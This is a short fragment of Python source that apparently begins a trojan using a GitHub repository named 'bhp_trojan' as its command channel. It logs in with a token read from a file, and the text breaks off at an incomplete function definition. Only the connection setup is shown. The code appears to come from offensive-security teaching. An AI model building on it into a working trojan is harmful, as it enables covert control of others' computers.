import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

def github_connect():
    with open('token.txt') as f:
        token = f.read()

        user = 'Dedede12345'
        sess = github3.login(token=token)
        return sess.repository(user, "bhp_trojan")

def get_file_contents(dirname)